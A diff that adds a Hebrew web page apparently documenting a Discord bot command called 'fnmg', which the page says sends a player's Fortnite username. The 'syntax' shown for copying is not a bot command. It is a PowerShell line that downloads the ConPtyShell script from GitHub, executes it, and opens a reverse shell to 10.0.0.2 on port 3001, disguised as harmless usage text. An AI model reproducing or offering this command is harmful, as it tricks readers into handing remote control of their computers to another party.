@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rubik&display=swap" rel="stylesheet">
+    <title>פקודת fnmg</title>
+</head>
+<body>
+    <div class="main">
+    <h1>fnmg :פקודה</h1>
+    <h2>:צורת כתיבה</h2>
+    <p id="text-to-copy">IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+    </p>
+    <button id="btnCopy" onclick="copyText(document.querySelector('#text-to-copy'));">העתק</button>
+    <h2>:דוגמא לתשובה</h2>
+    <p>MG_mengime: השם משתמש של אורי בפורטנייט הוא</p>
+    <h2>:סוג</h2>
+    <p>הודעה פרטית</p>
+    <h2>:פעולה</h2>
+    <p>שולח את השם של אורי בפורטנייט</p>
+    <A href="http://cmd.mengime.ml">חזרה לדף הבית--></A>
+    </div>
+    <div class="msg-div">
+        <p id="msg-suc"></p>
+    </div>
+    <div onmouseover="newText()" onmouseout= "oldText()" class="logo">
+        <a href="https://discord.gg/2hTs8PzGP2" target=_blank>
+          <p id="text">:לשרת הדיסקורד</p>
+          <br>
+          <img src="/images/logo.jpg" alt="logo">
+        </a>
+      </div>
+</body>
+    <script src="/js/copy.js"></script>
+    <script src="/js/logo.js"></script>
+
+</html>
